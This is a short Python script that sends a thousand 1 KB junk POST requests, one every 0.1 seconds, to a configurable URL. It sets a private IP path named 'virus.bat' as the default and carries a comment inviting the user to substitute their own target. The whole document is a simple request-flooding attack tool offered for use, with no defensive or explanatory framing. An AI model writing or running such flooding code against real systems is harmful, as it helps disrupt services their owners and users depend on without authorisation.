import requests
import time

def flood(url, size, interval):
    for _ in range(size):
        requests.post(url, data='X' * 1024)
        time.sleep(interval)

url = 'http://192.168.110.131/virus.bat'  # replace with your target URL
size = 1000  # number of requests to send
interval = 0.1  # seconds to wait between requests

flood(url, size, interval)